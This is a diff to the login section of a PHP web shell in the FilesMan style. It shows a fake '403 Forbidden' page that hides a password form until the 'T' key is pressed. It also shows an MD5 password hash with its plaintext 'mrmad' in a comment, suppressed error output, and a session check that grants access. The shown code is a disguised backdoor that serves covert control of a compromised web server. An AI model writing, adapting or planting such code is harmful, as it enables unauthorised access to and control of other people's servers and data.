@@ -9,16 +9,20 @@ session_start();
 @ini_set('display_errors', 0);
 @ini_set('display_startup_errors', 0);
 
-$password = "e00b29d5b34c3f78df09d45921c9ec47";
+/* Configuration */
+/* Password using md5 hashes */
+$password = "850b7a8a0a64ba3bc150838d86a47ebb"; //mrmad
 $default_action = "FilesMan";
 $default_use_ajax = true;
 $default_charset = 'UTF-8';
 date_default_timezone_set("Asia/Jakarta");
 
+// Function to display login form
 function login_shell() {
 ?>
-<!DOCTYPE html>
+    <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -30,6 +34,7 @@ function login_shell() {
                 background-color: #000 !important;
             }
         }
+
         body {
             color: #444;
             margin: 0;
@@ -37,6 +42,7 @@ function login_shell() {
             height: 100%;
             background-color: #fff;
         }
+
         .container {
             text-align: center;
             width: 800px;
@@ -45,12 +51,15 @@ function login_shell() {
             top: 30%;
             left: 50%;
         }
+
         .hidden {
             display: none;
         }
+
         form {
             margin-top: 20px;
         }
+
         input[type="password"] {
             background-color: #000;
             border: none;
@@ -58,9 +67,11 @@ function login_shell() {
             padding: 2px;
             color: #fff;
         }
+
         input[type="password"]:focus {
             outline: none;
         }
+
         input[type="submit"] {
             border: none;
             padding: 4.5px 20px;
@@ -70,17 +81,21 @@ function login_shell() {
         }
     </style>
 </head>
+
 <body>
     <div class="container">
         <h1 style="margin: 0; font-size: 150px; line-height: 150px; font-weight: bold;">403</h1>
         <h2 style="margin-top: 20px; font-size: 30px;">Forbidden</h2>
         <p>Access to this resource on the server is denied!</p>
+
         <form id="password-form" class="hidden" action="" method="post">
             <input type="password" name="pass" placeholder="&nbsp;...">
             <input type="submit" name="submit" value="=">
         </form>
     </div>
+
     <script>
+        // Event listener to show the password form when "T" key is pressed
         document.addEventListener("keydown", function (event) {
             if (event.key === "T" || event.key === "t") {
                 document.getElementById("password-form").classList.remove("hidden");
@@ -88,11 +103,14 @@ function login_shell() {
         });
     </script>
 </body>
+
 </html>
+
 <?php
     exit;
 }
 
+// Check if the user is logged in
 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
     if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
         $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
